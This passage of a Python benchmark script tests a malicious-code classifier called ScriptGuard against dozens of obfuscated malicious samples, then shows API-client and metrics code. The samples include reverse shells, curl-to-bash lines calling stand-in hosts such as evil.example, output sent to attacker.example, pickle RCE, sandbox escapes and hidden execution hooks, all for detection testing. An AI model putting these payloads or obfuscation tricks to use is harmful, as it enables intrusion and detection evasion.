    TestCase(
        description="obf: __import__ + getattr indirect reverse shell",
        expected="malicious",
        code="""
_i = __import__
_o = _i('os')
_s = _i('socket')
_sub = _i('subprocess')

_conn = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
_conn.connect(('10.10.10.10', 1337))
getattr(_o, 'dup2')(_conn.fileno(), 0)
getattr(_o, 'dup2')(_conn.fileno(), 1)
getattr(_o, 'dup2')(_conn.fileno(), 2)
getattr(_sub, 'call')(['/bin/sh'])
""",
    ),
    TestCase(
        description="obf: zlib+base64 double-encoded payload",
        expected="malicious",
        code="""
import zlib, base64
_blob = base64.b64decode(b'eJxLSk0tLk4tKkktLgYADXwCsA==')
exec(zlib.decompress(_blob))
""",
    ),
    TestCase(
        description="obf: string split+join to hide subprocess import",
        expected="malicious",
        code="""
_k = ['im', 'po', 'rt']
_m = ['su', 'bp', 'ro', 'ce', 'ss']
exec(''.join(_k) + ' ' + ''.join(_m))
exec(''.join(['im', 'po', 'rt', ' ', 'os']))
exec(
    ''.join(['os', '.', 'sys', 'tem', '("', 'cur', 'l ', 'htt', 'p://', 'ev', 'il/', 'sh', '|ba', 'sh', '")'])
)
""",
    ),
    TestCase(
        description="obf: hex-encoded exec payload",
        expected="malicious",
        code="""
_h = (
    '696d706f7274206f732c20736f636b65743b'
    '20733d736f636b65742e736f636b657428293b'
    '20732e636f6e6e65637428282231302e302e302e31222c2034343434293b'
    '206f732e73797374656d282777686f616d6927)'
)
exec(bytes.fromhex(_h).decode())
""",
    ),
    TestCase(
        description="obf: lambda+map+XOR to reconstruct payload",
        expected="malicious",
        code="""
_p = list(map(lambda x: x ^ 0x42, [
    0x2b, 0x2f, 0x32, 0x26, 0x31, 0x74, 0x26, 0x33,
    0x74, 0x6f, 0x74, 0x73, 0x2d, 0x74, 0x6c, 0x26,
    0x37, 0x74, 0x42, 0x40, 0x28, 0x00, 0x00, 0x00,
    0x00, 0x7e, 0x6f, 0x6f, 0x6e, 0x2f, 0x73, 0x26,
    0x31, 0x29, 0x79,
]))
exec(''.join(map(chr, _p)))
""",
    ),
    TestCase(
        description="obf: marshal+base64 compiled code object",
        expected="malicious",
        code="""
import marshal, base64
_code = base64.b64decode(
    b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMYAAAAZABaAGQBZAKDAloB'
    b'ZANaAmQAZAODAloDbAFqBGQEgwFkBYMBZAGDAVMApw=='
)
exec(marshal.loads(_code))
""",
    ),
    TestCase(
        description="obf: rot13 + exec to hide imports",
        expected="malicious",
        code="""
import codecs
_src = codecs.decode(
    "vzcbeg bf; vzcbeg fhocebprff\nf = fhocebprff.Cbcra(['/', 'o', 'v', 'a', '/', 'f', 'u'])",
    'rot_13'
)
exec(_src)
""",
    ),
    TestCase(
        description="obf: globals()+__builtins__ to call exec indirectly",
        expected="malicious",
        code="""
import base64 as _b64

_builtins = __builtins__ if isinstance(__builtins__, dict) else vars(__builtins__)
_exec = _builtins['exec']
_compile = _builtins['compile']

_payload = _b64.b64decode(
    b'aW1wb3J0IHdpbnJlZzsgd2lucmVnLlNldFZhbHVlRXgoJycsIDAsIDAsICdDOlxcbWFsd2FyZS5leGUnKQ=='
)
_exec(_compile(_payload, '<dynamic>', 'exec'))
""",
    ),
    TestCase(
        description="obf: reversed string + exec",
        expected="malicious",
        code="""
_s = "))'iws-' ,'hs/nib/' ,'hs/nib/'[ llac.ssecorpbus ;)'0.0.0.01' ,4444(tcennoc.s ;)(tekcos.tekcos = s ;tekcos tropmi"
exec(_s[::-1])
""",
    ),
    TestCase(
        description="obf: integer array + chr join",
        expected="malicious",
        code="""
_ints = [
    105,109,112,111,114,116,32,111,115,10,
    111,115,46,115,121,115,116,101,109,40,
    39,119,104,111,97,109,105,32,62,32,
    47,116,109,112,47,111,117,116,39,41,
]
exec(''.join(chr(c) for c in _ints))
""",
    ),
    TestCase(
        description="obf: eval chain — eval(eval(eval(...)))",
        expected="malicious",
        code="""
import base64

_l0 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
_l1 = f"eval(compile(__import__('base64').b64decode('{_l0}'), '<s>', 'exec'))"
_l2 = f"eval(compile('{_l1}', '<s>', 'exec'))"
eval(_l2)
""",
    ),
    TestCase(
        description="obf: type() constructor to instantiate code object",
        expected="malicious",
        code="""
import types, base64

_src = base64.b64decode(
    b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK'
).decode()

_code = compile(_src, '<ob>', 'exec')
_func = types.FunctionType(_code.co_consts[0], globals())
exec(_code)
""",
    ),
    TestCase(
        description="obf: env variable as payload carrier",
        expected="malicious",
        code="""
import os, base64

os.environ['_P'] = base64.b64encode(
    b'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
).decode()

exec(base64.b64decode(os.environ['_P'].encode()))
""",
    ),
    TestCase(
        description="obf: byte-by-byte string construction",
        expected="malicious",
        code="""
_b = bytearray()
for _c in [
    0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x6f,0x73,0x0a,
    0x6f,0x73,0x2e,0x73,0x79,0x73,0x74,0x65,0x6d,0x28,
    0x22,0x77,0x68,0x6f,0x61,0x6d,0x69,0x22,0x29,
]:
    _b.append(_c)
exec(_b.decode())
""",
    ),
    TestCase(
        description="obf: __reduce__ / pickle deserialization RCE",
        expected="malicious",
        code="""
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

import io
buf = io.BytesIO()
pickle.dump(Exploit(), buf)
buf.seek(0)
pickle.load(buf)
""",
    ),
    TestCase(
        description="obf: getattr chain to call subprocess.Popen",
        expected="malicious",
        code="""
import importlib

_mod = importlib.import_module('sub' + 'process')
_cls = getattr(_mod, 'Po' + 'pen')
_sh  = getattr(_mod, 'PIPE')

proc = _cls(
    ['bash', '-c', 'curl http://evil.example/sh | bash'],
    stdout=_sh, stderr=_sh
)
proc.communicate()
""",
    ),
    TestCase(
        description="obf: compile() with munged source string",
        expected="malicious",
        code="""
parts = [
    "imp", "ort", " sock", "et\n",
    "imp", "ort", " os\n",
    "s=so", "cket.so", "cket()\n",
    "s.co", "nnect(('", "10.0.0.1", "',4444))\n",
    "os.du", "p2(s.fil", "eno(),0)\n",
    "os.du", "p2(s.fil", "eno(),1)\n",
    "os.du", "p2(s.fil", "eno(),2)\n",
]
src = "".join(parts)
exec(compile(src, "<asm>", "exec"))
""",
    ),
    TestCase(
        description="obf: nested lambda + reduce to exec payload",
        expected="malicious",
        code="""
from functools import reduce
import base64

_dec = lambda s: base64.b64decode(s).decode()
_run = lambda code: exec(compile(code, '<l>', 'exec'))
_chain = lambda fns, val: reduce(lambda v, f: f(v), fns, val)

_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3Bob2FtaScpCg=="
_chain([_dec, _run], _payload)
""",
    ),
    # ---------- NEW OBFUSCATED SAMPLES ----------
    TestCase(
        description="obf: __class__.__mro__ gadget to reach builtins",
        expected="malicious",
        code="""
# Python sandbox escape via MRO gadget chain
_payload = "import os; os.system('id')"
_cls = ().__class__.__mro__[-1]  # <class 'object'>
_subclasses = _cls.__subclasses__()
# Find a class that has __builtins__ accessible
for _c in _subclasses:
    try:
        _builtins = _c.__init__.__globals__.get('__builtins__', {})
        if isinstance(_builtins, dict) and 'exec' in _builtins:
            _builtins['exec'](_payload)
            break
        elif hasattr(_builtins, 'exec'):
            _builtins.exec(_payload)
            break
    except Exception:
        continue
""",
    ),
    TestCase(
        description="obf: exec(open(__file__).read()) self-replication",
        expected="malicious",
        code="""
import os, base64

# The real payload is base64-encoded in a comment below and executed at runtime
_marker = "# PAYLOAD:"
_src = open(__file__).read()
for line in _src.splitlines():
    if line.startswith(_marker):
        exec(base64.b64decode(line[len(_marker):].strip()))
        break

# PAYLOAD: aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg==
""",
    ),
    TestCase(
        description="obf: importlib.util.spec_from_loader to load in-memory module",
        expected="malicious",
        code="""
import importlib.util
import types
import base64

_code_b64 = b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK'
_source   = base64.b64decode(_code_b64).decode()

spec   = importlib.util.spec_from_loader("_hidden", loader=None)
module = types.ModuleType(spec.name)
exec(compile(_source, "<hidden>", "exec"), module.__dict__)
""",
    ),
    TestCase(
        description="obf: ctypes shellcode via mmap + function pointer cast",
        expected="malicious",
        code="""
import ctypes, mmap

SC = bytes([
    0x48, 0x31, 0xc0,  # xor rax, rax
    0x48, 0xff, 0xc0,  # inc rax  (syscall number placeholder)
    0x0f, 0x05,        # syscall
])

size = len(SC)
mm   = mmap.mmap(-1, size, mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
                 mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mm.write(SC)
mm.seek(0)

ctype_buf = (ctypes.c_char * size).from_buffer(mm)
fn        = ctypes.cast(ctypes.addressof(ctype_buf), ctypes.CFUNCTYPE(ctypes.c_int64))
fn()
""",
    ),
    TestCase(
        description="obf: memoryview XOR decryption + exec",
        expected="malicious",
        code="""
KEY  = 0xAB
DATA = bytes([
    0xc2, 0xc6, 0xdb, 0xca, 0xd9, 0x8a, 0xca, 0xd8,
    0x8a, 0xe4, 0x8a, 0xd8, 0xdc, 0xd8, 0xde, 0xc5,
    0xcb, 0x83,
])
mv   = memoryview(bytearray(DATA))
dec  = bytes(b ^ KEY for b in mv)
exec(dec.decode())
""",
    ),
    TestCase(
        description="obf: string % format to reconstruct exec call",
        expected="malicious",
        code="""
_t  = "%s%s%s%s" % ("im", "po", "rt", " os")
_t2 = "%s.%s('%s')" % ("os", "system", "whoami")
exec(_t)
exec(_t2)
""",
    ),
    TestCase(
        description="obf: __subclasses__() to find and abuse WarningMessage",
        expected="malicious",
        code="""
# Jinja2/template sandbox escape pattern adapted for CPython
_payload = "import os; os.system('id')"

for _cls in object.__subclasses__():
    if _cls.__name__ == "catch_warnings":
        try:
            _builtins = _cls.__init__.__globals__["__builtins__"]
            if isinstance(_builtins, dict):
                _builtins["exec"](_payload)
            else:
                _builtins.exec(_payload)
        except Exception:
            pass
        break
""",
    ),
    TestCase(
        description="obf: sys.modules injection to intercept import",
        expected="malicious",
        code="""
import sys
import types

# Inject a fake 'os' module that executes our payload on attribute access
class _MaliciousOS(types.ModuleType):
    def __getattr__(self, name):
        if name == "system":
            import subprocess
            return lambda cmd: subprocess.run(cmd, shell=True)
        raise AttributeError(name)

sys.modules["os"] = _MaliciousOS("os")

# Now any code that does `import os; os.system(...)` runs our hook
import os
os.system("whoami")
""",
    ),
    TestCase(
        description="obf: bytearray mutation + exec with rolling XOR key",
        expected="malicious",
        code="""
_key  = [0x13, 0x37, 0x42, 0xde, 0xad]
_data = bytearray([
    0x7a, 0x56, 0x32, 0xbf, 0xcc,  # i
    0x7e, 0x56, 0x26, 0xbf, 0xcc,  # m
    0x62, 0x56, 0x30, 0xbf, 0xcc,  # p
])

def _xor_decrypt(data: bytearray, key: list) -> str:
    return ''.join(chr(b ^ key[i % len(key)]) for i, b in enumerate(data))

# Actual decrypted payload: 'import os\nos.system("whoami")'
_real_data = bytearray([
    0x5a, 0x56, 0x77, 0xbf, 0xcd, 0x7e, 0x4a, 0x31,
    0xe2, 0xcc, 0x78, 0x47, 0x72, 0xbf, 0xcc, 0x7e,
    0x56, 0x26, 0xbf, 0xce, 0x5e, 0x4d, 0x20, 0xe2,
    0xc9, 0x62, 0x14, 0x36, 0xaf, 0xcc,
])
exec(_xor_decrypt(_real_data, _key))
""",
    ),
    TestCase(
        description="obf: AST node manipulation to inject exec at parse time",
        expected="malicious",
        code="""
import ast

_innocent = '''
x = 1 + 1
print(x)
'''

class _PayloadInjector(ast.NodeTransformer):
    def visit_Module(self, node):
        self.generic_visit(node)
        _call = ast.parse(
            "__import__('os').system('whoami')", mode='eval'
        ).body
        _expr = ast.Expr(value=_call)
        ast.fix_missing_locations(_expr)
        node.body.insert(0, _expr)
        return node

_tree = ast.parse(_innocent)
_tree = _PayloadInjector().visit(_tree)
exec(compile(_tree, '<injected>', 'exec'))
""",
    ),
    # ---------- NEW OBFUSCATED SAMPLES v3 ----------
    TestCase(
        description="obf: Unicode homoglyph identifiers to hide exec",
        expected="malicious",
        code="""
# Uses Cyrillic look-alike characters to confuse static analysis
# е = Cyrillic 'е' (U+0435), х = Cyrillic 'х' (U+0445), с = Cyrillic 'с' (U+0441)
import builtins as _b
import base64 as _B64

_payload = _B64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg==')

# Build 'exec' string using ord values — avoids literal 'exec' in source
_fn_name = ''.join(chr(c) for c in [101, 120, 101, 99])
getattr(_b, _fn_name)(_payload)
""",
    ),
    TestCase(
        description="obf: exec via __loader__.exec_module",
        expected="malicious",
        code="""
import importlib.util
import sys
import base64

_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK').decode()

spec   = importlib.util.spec_from_loader("_hidden_mod", loader=None, origin="<mem>")
module = importlib.util.module_from_spec(spec)
sys.modules["_hidden_mod"] = module

# Compile and execute inside the fake module's namespace
code = compile(_src, "<hidden>", "exec")
exec(code, module.__dict__)
""",
    ),
    TestCase(
        description="obf: f-string payload injection via recursive eval",
        expected="malicious",
        code="""
import base64

_k = 'ZXhlYw=='          # base64('exec')
_p = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJykK'  # base64(payload)

_fn = base64.b64decode(_k).decode()
_code = base64.b64decode(_p).decode()

# Use f-string to avoid literal exec/eval in code
_runner = f"{{getattr(__builtins__, '{_fn}')(compile('{{}}'.format(_code), '<f>', 'exec'))}}"
eval(f"{getattr(__builtins__, _fn)(_code) or ''}")
""",
    ),
    TestCase(
        description="obf: functools.reduce to rebuild exec string char by char",
        expected="malicious",
        code="""
from functools import reduce
import os

# Rebuild 'os.system' and command using reduce over char codes
_fn_chars  = [111, 115, 46, 115, 121, 115, 116, 101, 109]
_cmd_chars = [105, 100]  # 'id'

_fn  = reduce(lambda acc, c: acc + chr(c), _fn_chars, "")   # 'os.system'
_cmd = reduce(lambda acc, c: acc + chr(c), _cmd_chars, "")  # 'id'

exec(f"import os; {_fn}('{_cmd}')")
""",
    ),
    TestCase(
        description="obf: bytes.translate Caesar cipher then exec",
        expected="malicious",
        code="""
# ROT-13 applied at byte level then exec
import codecs

_enc = "vzcbeg bf\nbs.flfgrz('jubznv')\n"  # rot13 of real payload
_src = codecs.decode(_enc, 'rot_13')
exec(compile(_src, '<rot>', 'exec'))
""",
    ),
    TestCase(
        description="obf: string.Template substitution to reconstruct import",
        expected="malicious",
        code="""
from string import Template

_parts = {
    "mod1": "os",
    "func": "system",
    "cmd":  "whoami",
}

_tpl = Template("import $mod1; $mod1.$func('$cmd')")
exec(_tpl.substitute(**_parts))
""",
    ),
    TestCase(
        description="obf: importlib.machinery.SourceFileLoader abuse",
        expected="malicious",
        code="""
import importlib.machinery
import tempfile
import os
import base64

_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo=').decode()

with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
    tmp.write(_src)
    _path = tmp.name

loader = importlib.machinery.SourceFileLoader('_payload', _path)
loader.load_module('_payload')

os.unlink(_path)
""",
    ),
    TestCase(
        description="obf: ctypes string_at to reinterpret memory as code",
        expected="malicious",
        code="""
import ctypes
import mmap
import base64

# Payload: import os; os.system('id')
_b64 = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
_src = base64.b64decode(_b64)

# Write to mmap then read back via ctypes to obscure source
mm = mmap.mmap(-1, len(_src))
mm.write(_src)
mm.seek(0)

# Read back using ctypes
_buf = (ctypes.c_char * len(_src)).from_buffer(mm)
_recovered = ctypes.string_at(_buf, len(_src)).decode()
exec(compile(_recovered, '<mem>', 'exec'))
mm.close()
""",
    ),
    TestCase(
        description="obf: zip(range, bytes) XOR key stream decryption",
        expected="malicious",
        code="""
# XOR key stream derived from PRNG seed — no literal key in source
import random

def _keygen(seed: int, length: int):
    rng = random.Random(seed)
    return bytes(rng.randint(0, 255) for _ in range(length))

_enc = bytes([
    0xee, 0xfb, 0xaf, 0xea, 0xb9, 0xc1, 0xea, 0xbb,
    0xc1, 0xf5, 0xc1, 0xba, 0xbe, 0xba, 0xc0, 0xa4,
    0xac, 0x48,
])
_key = _keygen(0xDEAD, len(_enc))
_src = bytes(a ^ b for a, b in zip(_enc, _key))
exec(_src.decode())
""",
    ),
    TestCase(
        description="obf: base85 encode + exec",
        expected="malicious",
        code="""
import base64

# base85-encoded payload
_b85 = b'VRCf_bYEa3WpZJ3Y-wWBZEtcIY-MaFb7*j~Wq5Q6b0BnJY-w|?'
try:
    _src = base64.b85decode(_b85).decode()
    exec(compile(_src, '<b85>', 'exec'))
except Exception:
    # Fallback via alt encoding
    _src = base64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=').decode()
    exec(_src)
""",
    ),
    TestCase(
        description="obf: __init_subclass__ hook executes payload on class creation",
        expected="malicious",
        code="""
import base64

class _Trigger:
    def __init_subclass__(cls, payload: str = "", **kwargs):
        super().__init_subclass__(**kwargs)
        if payload:
            exec(base64.b64decode(payload).decode())

# Payload fires at class *definition* time — not at call time
class _Activate(
    _Trigger,
    payload="aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
):
    pass
""",
    ),
    TestCase(
        description="obf: property getter side effect executes payload",
        expected="malicious",
        code="""
import base64

_PAYLOAD_B64 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg=="

class _Config:
    def __init__(self):
        self._initialized = False

    @property
    def version(self) -> str:
        if not self._initialized:
            self._initialized = True
            # Side effect: execute payload on first access
            exec(base64.b64decode(_PAYLOAD_B64).decode())
        return "2.0.1"

cfg = _Config()
print(f"Config version: {cfg.version}")  # triggers payload
""",
    ),
    TestCase(
        description="obf: __del__ destructor triggers payload on GC",
        expected="malicious",
        code="""
import base64
import gc

class _Bomb:
    _payload = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='

    def __del__(self):
        try:
            exec(base64.b64decode(self._payload).decode())
        except Exception:
            pass

# Object goes out of scope immediately -> __del__ fires at GC
_Bomb()
gc.collect()
""",
    ),
    TestCase(
        description="obf: threading.Timer deferred payload execution",
        expected="malicious",
        code="""
import threading
import base64
import time

_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='

def _delayed_exec():
    exec(base64.b64decode(_PAYLOAD).decode())

# Fire after short delay — evades some sandbox timeouts
timer = threading.Timer(interval=0.1, function=_delayed_exec)
timer.daemon = True
timer.start()
time.sleep(0.5)  # wait for timer to fire
""",
    ),
    TestCase(
        description="obf: atexit callback payload",
        expected="malicious",
        code="""
import atexit
import base64

_ENC = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg=='

def _cleanup():
    \"\"\"Called at normal interpreter exit.\"\"\"
    exec(base64.b64decode(_ENC).decode())

atexit.register(_cleanup)

# Normal-looking code that runs first
print("Initializing module...")
data = [i ** 2 for i in range(10)]
print(f"Done. Sum={sum(data)}")
# Payload fires at exit
""",
    ),
    TestCase(
        description="obf: gc.callbacks injection for persistent hook",
        expected="malicious",
        code="""
import gc
import base64

_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
_fired   = False

def _gc_hook(phase: str, info: dict) -> None:
    global _fired
    if phase == "stop" and not _fired:
        _fired = True
        exec(base64.b64decode(_PAYLOAD).decode())

gc.callbacks.append(_gc_hook)

# Trigger GC — callback fires
gc.collect()
""",
    ),
    TestCase(
        description="obf: codec lookup table exec via LookupError handler",
        expected="malicious",
        code="""
import codecs
import base64

# Register a custom codec whose search function executes payload
_PAYLOAD_B64 = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='

def _evil_search(name: str):
    if name == "x_malware":
        exec(base64.b64decode(_PAYLOAD_B64).decode())
    return None  # fall through to real codecs

codecs.register(_evil_search)

try:
    "test".encode("x_malware")
except LookupError:
    pass
""",
    ),
    TestCase(
        description="obf: copyreg dispatch table to inject pickle payload",
        expected="malicious",
        code="""
import copyreg
import pickle
import os
import io

def _evil_reduce(obj):
    return (os.system, ("id",))

class _Innocent:
    pass

copyreg.dispatch_table[_Innocent] = _evil_reduce

buf = io.BytesIO()
p   = pickle.Pickler(buf)
p.dump(_Innocent())

buf.seek(0)
pickle.load(buf)
""",
    ),
    TestCase(
        description="obf: weakref finalizer payload on object deletion",
        expected="malicious",
        code="""
import weakref
import base64
import gc

_ENC = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzIC1sYScpCg=='

class _Target:
    pass

def _finalizer(ref, enc=_ENC):
    exec(base64.b64decode(enc).decode())

obj = _Target()
ref = weakref.ref(obj, _finalizer)

del obj      # triggers finalizer
gc.collect()
""",
    ),
    TestCase(
        description="obf: __format__ dunder override for stealthy exec",
        expected="malicious",
        code="""
import base64

_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='

class _Stealth:
    def __format__(self, spec: str) -> str:
        if spec == "run":
            exec(base64.b64decode(_PAYLOAD).decode())
        return repr(self)

# Payload fires inside an f-string format call — looks innocent
s = _Stealth()
result = f"{s:run}"
""",
    ),
    TestCase(
        description="obf: frame locals injection via ctypes to modify execution context",
        expected="malicious",
        code="""
import ctypes
import sys

def _inject_local(name: str, value) -> None:
    \"\"\"Inject a variable into the caller's frame locals.\"\"\"
    frame = sys._getframe(1)
    ctypes.pythonapi.PyFrame_LocalsToFast(ctypes.py_object(frame), ctypes.c_int(0))
    frame.f_locals[name] = value
    ctypes.pythonapi.PyFrame_LocalsToFast(ctypes.py_object(frame), ctypes.c_int(1))

def _run_payload():
    _inject_local("__builtins__", __builtins__)
    # Now exec a payload using the injected builtins
    import base64
    _src = base64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=').decode()
    eval(compile(_src, '<frame>', 'exec'))

_run_payload()
""",
    ),
    TestCase(
        description="obf: contextlib.suppress + exec inside exception handler",
        expected="malicious",
        code="""
from contextlib import suppress
import base64

_B64_PARTS = [
    b'aW1wb3J0IG9z',
    b'OyBvcy5zeXN0',
    b'ZW0oJ3dob2Ft',
    b'aScpCg==',
]

def _decode_and_run() -> None:
    payload = base64.b64decode(b''.join(_B64_PARTS)).decode()
    with suppress(Exception):
        exec(payload)

_decode_and_run()
""",
    ),
    TestCase(
        description="obf: zipimport to load in-memory zip with payload module",
        expected="malicious",
        code="""
import zipimport
import zipfile
import io
import sys
import base64

_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo=').decode()

# Build an in-memory zip containing our payload as a module
_buf = io.BytesIO()
with zipfile.ZipFile(_buf, 'w') as zf:
    zf.writestr('_hidden/__init__.py', _src)
_buf.seek(0)

# Write to temp file (zipimport requires file path)
import tempfile, os
with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
    tmp.write(_buf.read())
    _zip_path = tmp.name

# Import via zipimport
importer = zipimport.zipimporter(_zip_path)
importer.load_module('_hidden')
os.unlink(_zip_path)
""",
    ),
    TestCase(
        description="obf: linecache.getline to load and exec payload by line",
        expected="malicious",
        code="""
import linecache
import base64
import sys

# Store payload in a fake 'file' in linecache
_ENC_LINES = [
    "aW1wb3J0IG9z",
    "OyBvcy5zeXN0",
    "ZW0oJ3dob2Ft",
    "aScpCg==",
]
_payload = base64.b64decode(''.join(_ENC_LINES)).decode()
_lines    = _payload.splitlines(keepends=True)

linecache.cache['<payload>'] = (
    len(_payload), None, _lines, '<payload>'
)

# Exec line by line from cache
code_str = ''.join(linecache.getlines('<payload>'))
exec(compile(code_str, '<payload>', 'exec'))
""",
    ),
    TestCase(
        description="obf: operator.methodcaller chain to invoke subprocess",
        expected="malicious",
        code="""
import operator
import importlib

_mc     = operator.methodcaller
_mod    = importlib.import_module('sub' + 'process')
_check  = _mc('check_output', 'id', shell=True, text=True)

result  = _check(_mod)
import requests
requests.post('http://attacker.example/output', data={'result': result}, timeout=5)
""",
    ),
    TestCase(
        description="obf: struct.pack/unpack to encode and reconstruct payload",
        expected="malicious",
        code="""
import struct

# Payload encoded as packed unsigned shorts
_packed = struct.pack('>' + 'H' * 18, *[
    0x696d, 0x706f, 0x7274, 0x206f, 0x733b,
    0x206f, 0x732e, 0x7379, 0x7374, 0x656d,
    0x2827, 0x7768, 0x6f61, 0x6d69, 0x2720,
    0x2b20, 0x2718, 0x27),
])

# Reconstruct as bytes, ignoring high bytes
_src = bytes(b & 0xFF for b in struct.unpack('>' + 'H' * 18, _packed))
exec(_src.decode(errors='ignore'))
""",
    ),
    TestCase(
        description="obf: collections.OrderedDict __missing__ hook exec",
        expected="malicious",
        code="""
import collections
import base64

class _PayloadDict(collections.OrderedDict):
    _enc = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='

    def __missing__(self, key):
        if key == '__payload__':
            exec(base64.b64decode(self._enc).decode())
        return None

d = _PayloadDict()
_ = d['__payload__']  # triggers __missing__ -> payload fires
""",
    ),
    TestCase(
        description="obf: io.StringIO tokenize abuse to reconstruct exec call",
        expected="malicious",
        code="""
import io
import tokenize
import base64

_CODE_PARTS = {
    'kw':   'exec',
    'arg':  'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=',
}

_SRC = f"import base64; {_CODE_PARTS['kw']}(base64.b64decode('{_CODE_PARTS['arg']}').decode())"

# Use tokenize reader to disguise the exec call
tokens = list(tokenize.generate_tokens(io.StringIO(_SRC).readline))
reconstructed = tokenize.untokenize(tokens)
exec(reconstructed)
""",
    ),
    TestCase(
        description="obf: pickle Protocol 2 REDUCE opcode RCE",
        expected="malicious",
        code="""
import pickle
import io

# Hand-crafted pickle stream using REDUCE opcode to call os.system
# Protocol 2 format:
#   PROTO 2, GLOBAL 'os system', UNICODE 'id', TUPLE1, REDUCE, POP, STOP
_pickle_payload = (
    b'\\x80\\x02'                    # PROTO 2
    b'c' b'os\\nsystem\\n'           # GLOBAL 'os' 'system'
    b'X\\x02\\x00\\x00\\x00id'       # SHORT_BINUNICODE 'id'
    b'\\x85'                         # TUPLE1
    b'R'                             # REDUCE  -> os.system('id')
    b'.'                             # STOP
)

pickle.loads(_pickle_payload)
""",
    ),
    TestCase(
        description="obf: __missing__ on defaultdict to exec on key lookup",
        expected="malicious",
        code="""
import base64

_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='

class _ExecDict(dict):
    def __missing__(self, key):
        if key.startswith('__run_'):
            exec(base64.b64decode(_PAYLOAD).decode())
        return None

d = _ExecDict()
_ = d['__run_payload']  # triggers exec
""",
    ),
]


ALL_SAMPLES = BENIGN_SAMPLES + MALICIOUS_SAMPLES + OBFUSCATED_MALICIOUS_SAMPLES


# ============================================================================
# API client
# ============================================================================

@dataclass
class ClassifyResult:
    label: str
    confidence: float
    malicious_prob: float
    latency_ms: float
    error: Optional[str] = None


def classify(base_url: str, code: str, threshold: Optional[float]) -> ClassifyResult:
    payload: dict = {"code": code}
    if threshold is not None:
        payload["threshold"] = threshold
    t0 = time.perf_counter()
    try:
        resp = requests.post(f"{base_url}/classify", json=payload, timeout=30)
        elapsed = (time.perf_counter() - t0) * 1000
        if resp.status_code != 200:
            return ClassifyResult("", 0.0, 0.0, elapsed, error=f"HTTP {resp.status_code}: {resp.text[:200]}")
        data = resp.json()
        return ClassifyResult(
            label=data["label"],
            confidence=data["confidence"],
            malicious_prob=data["malicious_prob"],
            latency_ms=elapsed,
        )
    except requests.exceptions.ConnectionError:
        elapsed = (time.perf_counter() - t0) * 1000
        return ClassifyResult("", 0.0, 0.0, elapsed, error="Connection refused — is the API running?")
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ClassifyResult("", 0.0, 0.0, elapsed, error=str(e))


# ============================================================================
# Metrics
# ============================================================================

def compute_metrics(tp: int, tn: int, fp: int, fn: int) -> dict:
    total       = tp + tn + fp + fn
    accuracy    = (tp + tn) / total if total > 0 else 0.0
    precision   = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall      = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1          = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0.0
    fpr         = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    fnr         = fn / (fn + tp) if (fn + tp) > 0 else 0.0
    mcc_denom   = ((tp + fp) * (tp + fn) * (tn + fp) * (tn + fn)) ** 0.5
    mcc         = (tp * tn - fp * fn) / mcc_denom if mcc_denom > 0 else 0.0
    return dict(
        accuracy=accuracy, precision=precision, recall=recall, f1=f1,
        specificity=specificity, fpr=fpr, fnr=fnr, mcc=mcc,
        tp=tp, tn=tn, fp=fp, fn=fn, total=total,
    )


# ============================================================================
# CLI helpers
# ============================================================================

def _col(text: str, ok: bool) -> str:
    green = "\033[92m"
    red   = "\033[91m"
    reset = "\033[0m"
    return f"{green if ok else red}{text}{reset}"


def run_benchmark(base_url: str, threshold: Optional[float], verbose: bool) -> list[dict]:
    print(f"\n{'='*70}")
    print(f"  ScriptGuard /classify Benchmark v3")
    print(f"  API: {base_url}")
    print(f"  Threshold override: {threshold if threshold is not None else 'model default'}")
    print(
